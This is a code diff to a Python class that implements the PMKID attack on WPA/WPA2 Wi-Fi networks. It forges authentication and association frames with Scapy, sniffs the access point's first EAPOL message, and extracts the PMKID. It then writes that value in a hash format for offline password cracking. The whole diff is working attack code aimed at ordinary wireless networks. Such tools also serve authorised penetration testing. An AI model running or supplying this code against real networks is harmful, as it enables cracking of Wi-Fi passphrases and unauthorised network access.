@@ -46,6 +46,12 @@ class Dot11EltEssid(Dot11Elt):
 
 class PMKID:
 
+	__PACKET = None
+
+	__FNONCE = "0000000000000000000000000000000000000000000000000000000000000000"
+	__FMIC   = "00000000000000000000000000000000"
+	__FPMKID = '00000000000000000000000000000000'
+
 	__AUTHRUNNER = True
 	__AUTHSTATUS = True
 
@@ -134,6 +140,8 @@ class PMKID:
 						) / Dot11AssoReq(cap="short-slot+ESS+privacy+short-preamble", listen_interval=0x00a) / payload
 
 		extlayers = []
+		finlayers = []
+		pktslayer = []
 		eltlayers = self.beacon.getlayer(Dot11Elt)
 
 		counter = 0
@@ -143,31 +151,42 @@ class PMKID:
 			if hasattr(layer, "ID"):
 				identifier = getattr(layer, "ID")
 				if identifier in possibilities:
+
 					clayer = layer.copy()
 					clayer[0].remove_payload()
 					extlayers.append(clayer)
+
 			counter += 1
 			layer = eltlayers.getlayer(counter)
 
+		counter = 1
+		layer = eltlayers.getlayer(counter)
+		while layer:
+			if hasattr(layer, "ID"):
+				clayer = layer.copy()
+				clayer[0].remove_payload()
+				finlayers.append(clayer)
+
+			counter += 1
+			layer = eltlayers.getlayer(counter)
+
+		parta = pkt.copy()
+		partb = pkt.copy()
+
 		for layer in extlayers:
-			pkt /= layer
+			parta /= layer
+			
+		for n in range(5):
+			pktslayer.append(parta)
 
-		#pkt.show()
+		for layer in finlayers:
+			partb /= layer
+			pktslayer.append(partb)
 
-		#sys.exit()
-
-		return pkt
+		return pktslayer
 
 	def auth_sender(self, pkt):
 		while self.__AUTHRUNNER:
-			sendp(
-				pkt,
-				iface=self.interface,
-				count=self.pauth,
-				inter=self.dauth,
-				verbose=False
-			)
-
 			if self.__AUTHRUNNER:
 				pull.print(
 					"*",
@@ -183,6 +202,14 @@ class PMKID:
 					pull.YELLOW
 				)
 
+			sendp(
+				pkt,
+				iface=self.interface,
+				count=self.pauth,
+				inter=self.dauth,
+				verbose=False
+			)
+
 		self.__AUTHSTATUS = False
 
 	def auth_receiver(self, pkt):
@@ -191,11 +218,13 @@ class PMKID:
 			sn     = retval[0]
 			rc     = retval[1]
 
-			if sn == self.bssid and rc == self.myaddress and pkt.getlayer(Dot11Auth).seqnum == 2 and pkt.getlayer(Dot11Auth).status == 0:
+			status = pkt.getlayer(Dot11Auth).status
+
+			if sn == self.bssid and rc == self.myaddress and pkt.getlayer(Dot11Auth).seqnum == 2 and status == 0:
 				pull.print(
-					"$",
+					"$" if status == 0 else "-",
 					"Authentication Res. [{status}] ({apvendor}) {ap} <--> ({stavendor}) {sta} ({essid})".format(
-						status=pull.GREEN+"Confirmed!"+pull.END,
+						status=pull.GREEN+"Confirmed"+pull.END if status == 0 else pull.RED+"Denied"+pull.END,
 						apvendor=pull.DARKCYAN+pull.get_mac(self.bssid)+pull.END,
 						ap=self.bssid.upper(),
 						stavendor=pull.DARKCYAN+pull.get_mac(self.myaddress)+pull.END,
@@ -203,48 +232,80 @@ class PMKID:
 						essid=pull.YELLOW+self.essid+pull.END
 					),
 					"\r",
-					pull.GREEN
+					pull.GREEN if status == 0 else pull.RED
 				)
 				raise KeyboardInterrupt()
 
-	def asso_sender(self, pkt):
+	def asso_sender(self, pkts):
 		while self.__ASSORUNNER:
-			sendp(
-				pkt,
-				iface=self.interface,
-				count=self.passo,
-				inter=self.dasso,
-				verbose=False
-			)
+			for pkt in pkts:
+				if self.__ASSORUNNER:
+					pull.print(
+						"*",
+						"Association Req. Stance [{packets}-{length}] ({apvendor}) {ap} <--> ({stavendor}) {sta} ({essid})".format(
+							packets=pull.RED+str(self.passo)+pull.END,
+							length=pull.RED+str(len(pkt))+pull.END,
+							apvendor=pull.DARKCYAN+pull.get_mac(self.bssid)+pull.END,
+							ap=self.bssid.upper(),
+							stavendor=pull.DARKCYAN+pull.get_mac(self.myaddress)+pull.END,
+							sta=self.myaddress.upper(),
+							essid=pull.YELLOW+self.essid+pull.END
+						),
+						"\r",
+						pull.YELLOW
+					)
 
-			if self.__ASSORUNNER:
-				pull.print(
-					"*",
-					"Association Req. Count [{packets}] ({apvendor}) {ap} <--> ({stavendor}) {sta} ({essid})".format(
-						packets=pull.RED+str(self.passo)+pull.END,
-						apvendor=pull.DARKCYAN+pull.get_mac(self.bssid)+pull.END,
-						ap=self.bssid.upper(),
-						stavendor=pull.DARKCYAN+pull.get_mac(self.myaddress)+pull.END,
-						sta=self.myaddress.upper(),
-						essid=pull.YELLOW+self.essid+pull.END
-					),
-					"\r",
-					pull.YELLOW
-				)
+					sendp(
+						pkt,
+						iface=self.interface,
+						count=self.passo,
+						inter=self.dasso,
+						verbose=False
+					)
 
 		self.__ASSOSTATUS = False
 
 	def asso_receiver(self, pkt):
 		if pkt.haslayer(Dot11AssoResp):
+			status = pkt.getlayer(Dot11AssoResp).status
 			retval = self.extract_sn_rc(pkt)
 			sn     = retval[0]
 			rc     = retval[1]
 
 			if sn == self.bssid and rc == self.myaddress:
 				pull.print(
+					"$" if status == 0 else "-",
+					"Association Res. [{status}-{response}] ({apvendor}) {ap} <--> ({stavendor}) {sta} ({essid})".format(
+						status=(pull.GREEN+"Confirmed"+pull.END if status == 0 else pull.RED+"Denied"+pull.END),
+						response=(pull.GREEN+"0"+pull.END if status == 0 else pull.RED+str(status)+pull.END),
+						apvendor=pull.DARKCYAN+pull.get_mac(self.bssid)+pull.END,
+						ap=self.bssid.upper(),
+						stavendor=pull.DARKCYAN+pull.get_mac(self.myaddress)+pull.END,
+						sta=self.myaddress.upper(),
+						essid=pull.YELLOW+self.essid+pull.END
+					),
+					"\r",
+					pull.GREEN if status == 0 else pull.RED
+				)
+
+		capture = self.eapol_receiver(pkt)
+		if capture:
+			raise KeyboardInterrupt()
+
+	def eapol_receiver(self, pkt):
+		if pkt.haslayer(EAPOL):
+			retval = self.extract_sn_rc(pkt)
+			sn     = retval[0]
+			rc     = retval[1]
+			nn     = binascii.hexlify(pkt.getlayer(Raw).load)[26:90].decode()
+			mc     = binascii.hexlify(pkt.getlayer(Raw).load)[154:186].decode()
+
+			if sn == self.bssid and rc == self.myaddress and nn != self.__FNONCE and mc == self.__FMIC:
+				self.__PACKET = pkt
+				pull.print(
 					"$",
-					"Association Res. [{status}] ({apvendor}) {ap} <--> ({stavendor}) {sta} ({essid})".format(
-						status=pull.GREEN+"Confirmed!"+pull.END,
+					"EAPOLT (1 of 4). [{status}] ({apvendor}) {ap} <--> ({stavendor}) {sta} ({essid})".format(
+						status=pull.GREEN+"Confirmed"+pull.END,
 						apvendor=pull.DARKCYAN+pull.get_mac(self.bssid)+pull.END,
 						ap=self.bssid.upper(),
 						stavendor=pull.DARKCYAN+pull.get_mac(self.myaddress)+pull.END,
@@ -254,32 +315,48 @@ class PMKID:
 					"\r",
 					pull.GREEN
 				)
+				return True
 
-				#raise KeyboardInterrupt()
+		return None
 
-		elif pkt.haslayer(EAPOL):
-			retval = self.extract_sn_rc(pkt)
-			sn     = retval[0]
-			rc     = retval[1]
+	def extract(self, pkt):
+		pmk = binascii.hexlify(pkt.getlayer(Raw).load)[202:234].decode()
 
-			#print("EAPOL Received!")
-
-			if sn == self.bssid and rc == self.myaddress:
-				pull.print(
-					"$",
-					"EAPOL (1 of 4). [{status}] ({apvendor}) {ap} <--> ({stavendor}) {sta} ({essid})".format(
-						status=pull.GREEN+"Confirmed!"+pull.END,
-						apvendor=pull.DARKCYAN+pull.get_mac(self.bssid)+pull.END,
-						ap=self.bssid.upper(),
-						stavendor=pull.DARKCYAN+pull.get_mac(self.myaddress)+pull.END,
-						sta=self.myaddress.upper(),
-						essid=pull.YELLOW+self.essid+pull.END
+		if pmk != self.__FPMKID:
+			pull.print(
+					"*",
+					"Extracted. Vulnerable! PMKID [{pmkid}]".format(
+						pmkid=pmk
 					),
-					"\r",
-					pull.GREEN
+					pull.DARKCYAN
 				)
+			return pmk
+		else:
+			pull.print(
+					"-",
+					"Target is not Vulnerable to PMKID Attack. Received Empty PMKID payload",
+					pull.RED
+				)
+			return None
 
-				#raise ValueError()
+	def write(self, pmkid):
+		if self.output:
+			fl = open(self.output, "w")
+			fl.write(
+				"{pmkid}*{apmac}*{clmac}*{essid}\n".format(
+					pmkid=pmkid,
+					apmac=self.bssid.replace(":", ""),
+					clmac=self.myaddress.replace(":", ""),
+					essid=binascii.hexlify(self.essid)
+				)
+			)
+
+			pull.print(
+				"*",
+				"Captured. FL [{output}]".format(
+					self.output
+				)
+			)
 
 	def engage(self):
 		self.myaddress  = self.get_my_address()
@@ -287,24 +364,33 @@ class PMKID:
 		asso_frame = self.forge_asso_frame( self.bssid, self.myaddress )
 
 
-		while self.__EAPOSTATUS:
-			t = threading.Thread(target=self.auth_sender, args=(auth_frame,))
-			t.daemon = True
-			t.start()
+		t = threading.Thread(target=self.auth_sender, args=(auth_frame,))
+		t.daemon = True
+		t.start()
 
-			sniff(iface=self.interface, prn=self.auth_receiver)
+		sniff(iface=self.interface, prn=self.auth_receiver)
 
-			self.__AUTHRUNNER = False
-			while self.__AUTHSTATUS:
-				pass
+		self.__AUTHRUNNER = False
+		while self.__AUTHSTATUS:
+			pass
 
-			t = threading.Thread(target=self.asso_sender, args=(asso_frame,))
-			t.daemon = True
-			t.start()
+		t = threading.Thread(target=self.asso_sender, args=(asso_frame,))
+		t.daemon = True
+		t.start()
 
-			sniff(iface=self.interface, prn=self.asso_receiver)
+		sniff(iface=self.interface, prn=self.asso_receiver)
 
-			self.__ASSORUNNER = False
-			while self.__ASSOSTATUS:
-				pass
+		pull.print(
+			"*",
+			"Stopping Services. Captured EAPOL",
+			pull.DARKCYAN
+		)
+
+		self.__ASSORUNNER = False
+		while self.__ASSOSTATUS:
+			pass
+
+		pmk = self.extract( self.__PACKET )
+
+		self.write( pmk )
 
